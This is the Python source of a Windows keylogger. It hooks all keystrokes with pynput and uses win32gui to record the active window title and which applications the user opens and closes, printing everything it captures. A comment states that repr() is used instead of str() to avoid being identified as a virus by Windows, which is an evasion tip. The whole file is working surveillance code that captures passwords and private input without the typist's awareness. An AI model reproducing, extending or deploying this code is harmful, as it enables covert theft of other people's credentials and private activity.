import sys
from win32gui import GetWindowText, GetForegroundWindow, EnumWindows, IsWindowVisible
from pynput.keyboard import Listener

class Keylogger:
    def __init__(self):
        self.window = ""
        self.open_windows = []


    def start_listen(self):
        # get key strokes
        with Listener(on_press = self.key_strokes) as listener:
            listener.join()


    def key_strokes(self, key):
        '''
        repr() - almost the same as str() yet if you use str(),
        windows identifies you as a virus.
        repr(key) returns "<Key.[key-name]: <27>>"
        '''
        current_window = GetWindowText(GetForegroundWindow())
        self.get_open_windows()
       
        if self.window != current_window:
            self.window = current_window
            print(f'\nUser moved to {current_window}')
        if self.open_windows != self.current_open_windows:
            print(f'User opened {[app for app in set(self.current_open_windows)-set(self.open_windows)]}') if set(self.current_open_windows)-set(self.open_windows) else None
            print(f'User closed {[app for app in set(self.open_windows)-set(self.current_open_windows)]}') if set(self.open_windows)-set(self.current_open_windows) else None
            self.open_windows = self.current_open_windows
      
        try:
            print(key.char, end = '')
        except AttributeError:
            # key name is between '.' and ':', see
            # function docstring for original string
            keyname = repr(key).split('.')[1].split(':')[0]

            if keyname == 'enter':
                print()
            elif keyname == 'space':
                print(' ', end = '')
            elif keyname == 'backspace':
                sys.stdout.write('\b')
            else:
                print(f" SPECIAL_{keyname} ", end = '')


    def get_open_windows(self):
        self.current_open_windows = []
        EnumWindows(self.winEnumHandler, None)


    def winEnumHandler(self, hwnd, ctx):
        if IsWindowVisible(hwnd):
            n = GetWindowText(hwnd)  
            if n:
                self.current_open_windows.append(n)


def main():
    keylogger = Keylogger()
    keylogger.start_listen()

if __name__ == '__main__':
    main()
